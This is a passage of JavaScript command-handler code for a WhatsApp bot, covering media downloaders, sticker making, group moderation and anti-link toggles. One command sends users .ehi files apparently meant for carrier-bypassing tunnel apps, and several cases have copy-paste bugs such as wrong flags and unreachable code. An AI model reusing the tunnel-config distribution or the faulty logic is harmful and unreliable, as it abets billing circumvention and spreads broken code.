┃*☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒*┃
┃◈━━━━━━━━━━━━◈
┃  📥MEDIA DOWNLOADER📥
┃      ◈━━━━━━━◈
┗━━━━━━━━━━━━━꧂`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'tiktok':{ 
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio ${q}`, buttonText: { displayText: `AUDIO‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
XeonBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
})
}
break
case 'img':
case 'image': {
XeonBotInc.sendMessage(from, { react: { text: `🏞️`, key: m.key }})
                if (!text) throw `Example : ${prefix + command} car`
                m.reply("*🌍🔗I AM UPLODING 6 PHOTOS🔗🌍*")
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[Math.floor(Math.random() * search.videos.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
XeonBotInc.sendMessage(m.chat, { image: { url: anulay.thumbnail }, caption: `☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒` }, { quoted: m })
            }
            break
XeonBotInc.sendMessage(from, { react: { text: `📇`, key: m.key }})
case 'lyrics':
if (!text) throw `Song name?`
const findLyrics = require('simple-find-lyrics')
try {
const lyrics = await findLyrics(text)
if (lyrics.lyrics == '') return console.log("it's f up")
var txt = `
*${themeemoji} Title :* ${lyrics.title}
*${themeemoji} Artist :* ${lyrics.artist}
*${themeemoji} Lyrics :-* \n
${lyrics.lyrics}`
console.log(lyrics)
 await XeonBotInc.sendMessage(m.chat, {text:txt},{quoted:m})
} catch (err) {
    console.log(err)
    }
      break
case 'mediafire': {
XeonBotInc.sendMessage(from, { react: { text: `🗂️`, key: m.key }})
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
m.reply(`${result4}`)
XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
case 'ig': case 'instagram': case 'reels':{ //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
XeonBotInc.sendMessage(from, { react: { text: `💠`, key: m.key }})
if (args.length === 0) throw `Where is the link?\nSend ${prefix + command} url`
        let urlInsta = args[0];
        if (!(urlInsta.includes("instagram.com/p/") ||
            urlInsta.includes("instagram.com/reel/") ||
            urlInsta.includes("instagram.com/tv/")))
            return XeonBotInc.sendMessage(
                m.chat,
                { text: `The link you provided is not a instagram link` },
                { quoted: m }
            );      
            if (urlInsta.includes("?"))
            urlInsta = urlInsta.split("/?")[0];
        console.log(urlInsta);
        ig.fetchPost(urlInsta).then((res) => {
            if (res.media_count == 1) {
                if (res.links[0].type == "video") {
                    XeonBotInc.sendMessage(
                        m.chat,
                        {
                            video: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }else if (res.links[0].type == "image") {
                    XeonBotInc.sendMessage(
                        m.chat,
                        {
                            image: { url: res.links[0].url }
                        },
                        { quoted: m }
                    )
                }
            }
            else if (res.media_count > 1) {
                for (let i = 0; i < res.media_count; i++) {
                    if (res.links[i].type == "video") {
                        XeonBotInc.sendMessage(
                            m.chat,
                            {
                                video: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    } else if (res.links[i].type == "image") {
                        XeonBotInc.sendMessage(
                            m.chat,
                            {
                                image: { url: res.links[i].url }
                            },
                            { quoted: m }
                        )
                    }
                }
            }            
        }).catch((error) => {
            console.log(error);
            XeonBotInc.sendMessage(m.chat, { text: `Must be private or unavailable` }, { quoted: m })
        });
}
break
case 'spotify': //credit: Ray Senpai❤️ https://github.com/EternityBots/Nezuko
XeonBotInc.sendMessage(from, { react: { text: `🌐`, key: m.key }})
if (!text) return m.reply(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) throw `The link you provided is not spotify link`
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await XeonBotInc.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await XeonBotInc.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
    break
            case 'tomp3': {
XeonBotInc.sendMessage(from, { react: { text: `🎼`, key: m.key }})
            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${XeonBotInc.user.name}.mp3`}, { quoted : m })
            }
            break
case 'sticker': case 's': {
XeonBotInc.sendMessage(from, { react: { text: `😈`, key: m.key }})
            if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*උපරිම මිනිත්තු 10 විය යුතයි*')
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Send Image/Video With Caption* ${prefix + command}\nDuration *Video 1-9 Seconds*`
                }
            }
              break
 case 'ehi': case 'ehi1': {
 XeonBotInc.sendMessage(from, { react: { text: `🚀`, key: m.key }})
 await XeonBotInc.sendMessage(m.chat, {document:{url:`https://github.com/Prameshnnnn/Pramesh-pn-whatsapp-bot/blob/master/XeonMedia/file/%F0%9F%98%88ALL%20ZOOM%F0%9F%98%88.ehi`}, mimetype:"application/document", fileName: `😈ALL ZOOM😈.ehi`}, { quoted: m })
await XeonBotInc.sendMessage(m.chat, {document:{url:`https://github.com/Prameshnnnn/Pramesh-pn-whatsapp-bot/blob/master/XeonMedia/file/%F0%9F%98%88ALL%20FACEBOOK%20%F0%9F%98%88.ehi`}, mimetype:"application/document", fileName: `😈ALL FACEBOOK 😈.ehi`}, { quoted: m })
await XeonBotInc.sendMessage(m.chat, {document:{url:`https://github.com/Prameshnnnn/Pramesh-pn-whatsapp-bot/blob/master/XeonMedia/file/%F0%9F%98%88ALL%20WHATSAPP%20%F0%9F%98%88.ehi`}, mimetype:"application/document", fileName: `😈ALL WHATSAPP 😈.ehi`}, { quoted: m })
await XeonBotInc.sendMessage(m.chat, {document:{url:`https://github.com/Prameshnnnn/Pramesh-pn-whatsapp-bot/blob/master/XeonMedia/file/%F0%9F%98%88ALL%20YOUTUBE%20%F0%9F%98%88.ehi`}, mimetype:"application/document", fileName: `😈ALL YOUTUBE 😈.ehi`}, { quoted: m })
}
break
case 'playstore': case 'apk':
XeonBotInc.sendMessage(from, { react: { text: `🗂️`, key: m.key }})
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if(!q) return reply('what are you looking for?')
let play = await hx.playstore(q)
let storee = '❉─────────────────────❉\n'
for (let i of play){
storee += `\n*「 *PLAY STORE* 」*\n
- *Name* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Dev Link* : ${i.link_dev}\n❉─────────────────────❉`
}
reply(storee)
break
case 'film':
XeonBotInc.sendMessage(from, { react: { text: `🏕️`, key: m.key }})
if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
	reply(mess.wait)
if (!q) return reply(`What film you wanna search?\nExample: ${prefix}film Spiderman`)
xeonkey.Film(q)
    .then(data => {console.log(data)
    let krl = `*❒「  Film ${q} 」*\n*🌿 Author* : ${data[0].author}\n\n`
			    for (let i of data) {
                krl += (`\n────────────────────\n\n *📍Title :* ${i.judul}\n *📟 Quality :* ${i.quality}\n *🖥️ Type : ${i.type}*\n *⌛ Uploaded :* ${i.upload}\n *🌍 Source :* ${i.link}`)
                }
               XeonBotInc.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
});
break
            case 'join': {
        XeonBotInc.sendMessage(from, { react: { text: `👨‍👩‍👧‍👦`, key: m.key }})
                if (!isCreator) throw mess.owner
                if (!text) throw 'Enter the group link!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await XeonBotInc.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leavegc': {
            XeonBotInc.sendMessage(from, { react: { text: `👤`, key: m.key }})
                if (!isCreator) throw mess.owner
                await XeonBotInc.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
	case 'kick': {
	XeonBotInc.sendMessage(from, { react: { text: `🤺`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	XeonBotInc.sendMessage(from, { react: { text: `🫂`, key: m.key }})
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
        XeonBotInc.sendMessage(from, { react: { text: `😡`, key: m.key }})
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
        XeonBotInc.sendMessage(from, { react: { text: `🫂`, key: m.key }})
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setbotpp': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
            XeonBotInc.sendMessage(from, { react: { text: `📋`, key: m.key }})
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 🌿 *Message : ${q ? q : 'empty'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
            XeonBotInc.sendMessage(from, { react: { text: `🏇`, key: m.key }})
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
         case 'translate': case 'tr':{
XeonBotInc.sendMessage(from, { react: { text: `🖋️`, key: m.key }})
         	if (!text) throw `Example : ${prefix + command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             XeonBotInc.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m })
         	}
         break 
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning on youtube video antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply('Success in turning off youtube video antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply('Success in turning on youtube channel antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply('Success in turning off youtube channel antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('Already activated')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning on instagram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply('Success in turning off instagram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning on facebook antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply('Success in turning off facebook antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning on telegram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply('Success in turning off telegram antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning on tiktok antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply('Success in turning off tiktok antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning on twitter antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply('Success in turning off twitter antilink in this group')
} else {
  let buttonsntilink = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
m.reply('Success in turning on all antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
